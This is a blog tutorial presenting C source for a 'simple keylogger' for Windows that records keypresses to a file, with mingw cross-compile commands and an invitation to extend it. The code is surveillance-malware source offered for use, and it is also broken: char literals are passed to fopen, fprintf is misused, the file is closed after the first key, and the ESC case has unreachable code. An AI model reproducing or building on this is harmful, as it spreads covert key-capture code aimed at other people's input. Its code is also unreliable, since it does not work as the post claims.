---
title: "Simple Keylogger for Windows"
draft: false
author: "Aryan Kapse"
---

# Simple Keylogger for Windows


**Very important note**:

    This Program To be used for educational use and not for malicious tasks!
    I will NOT be held responsible for anything silly you may do with this!


- **What is Keylogger** ?
keylogger is application or a program that record the keys pressed by user and store into file


Program:

**NOTE**: we are writing simple demonstration program in which we using fucntion called `kbhit()` to detect if any key is pressed on keyboard. this is not advance keylogger, you can use this keylogger and upgrade it as you want.

**Code**
```c
/* file:keylogger.c */
/* Author: Dr.Deathvolt */

//we need to include the library for input and output
#include<stdio.h>
// we need to include the library which can give us console input output
// this library also contain the funciton which we are going to use `kbhit()`
#include<conio.h>

int main(){
	char ch;
	while(1){
		if(kbhit()){
			// kbhit() to detect any key is pressed on keyboard
			ch = getch(); // storing pressed key value in ch variable

			if((int)ch == 27) //if ESC(in ascii 27) is pressed
				break; // then break the while loop
			printf("\n Key pressed = %c",ch); // printing pressed keys
		}
	}
	return 0;
}
```

**NOTE**:(for Linux users who coding this program on linux)
- Linux doesn't have `<conio.h>`
- You need to install `mingw-w64` to compile programs for Windows
- `sudo apt-get install mingw-w64`
	- compile the program
	- for 32-bit `i686-w64-mingw32-gcc -o test.exe test.c`
	- for 64-bit `x86_64-w64-mingw32-gcc -o test.exe test.c`
- You need to run that exe file on Windows

### File Operations

now we need to store this pressed keys record into file

So, first we define `FILE` datatype which we use as a variable to a file and we are using some file functions like `fopen()`,`fprintf()`,`fclose()`,`fputc()` etc.

**Code**
```c
/* File : Keylogger.c */
/* Author : Dr.Deathvolt */

#include<stdio.h>
#include<conio.h>

int main(){
	char ch;
	FILE *f;
	f = fopen('keys.txt','a'); // opening file in variable 'f'
	// we are opening 'keys.txt' file in appending mode
	// if keys.txt file is not present in program directory
	// append mode will create the file
	while(1){
		if(kbhit()){
			ch = getch();
			fprintf(f,ch); // writing 'ch' data in 'f' file (means keys.txt file)
			if((int)ch == 27) 
				break;
			//this time after breaking the while loop we are not printing any data on console we are storing the data into a file.
			fclose(f); //fclose() will close the file.
		}
	}
	return 0;
}
```

**Final Step**
now we are on final stage, if user will press [ESC] or [TAB] like keys how you will understand where and when this keys are pressed?
for that we are writing some condition statements to detect if any of this special keys will pressed.

> we are using hex codes of this keys to detect if that key is pressed or not.

- You can get this hex values [here](https://www.rapidtables.com/code/text/ascii-table.html)

```c
/* File : Keylogger.c */
/* Author : Dr.Deathvolt */

#include<stdio.h>
#include<conio.h>

int main(){
	char ch;
	FILE *f;
	f = fopen('keys.txt','a');
	while(1){
		if(kbhit()){
			ch = getch();
			//checking hex value of pressed key and writing into a file
			switch ((int)ch){
                case ' ': // Space key
                    fprintf(f, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(f, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(f, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    break;
                    fprintf(f, "[ESC]");
                case 0x08: // Backspace key.
                    fprintf(f, "[BACKSPACE]");
                    break;
                default:
                    fputc(ch,f); // other keys will by default print in file
            }
			if((int)ch == 27) 
				break;
			fclose(f);
		}
	}
	return 0;
}

```

This is Just a demonstartion that explain How keyloggers work.

Thank You for Reading, Hope You Learned something from it :^)

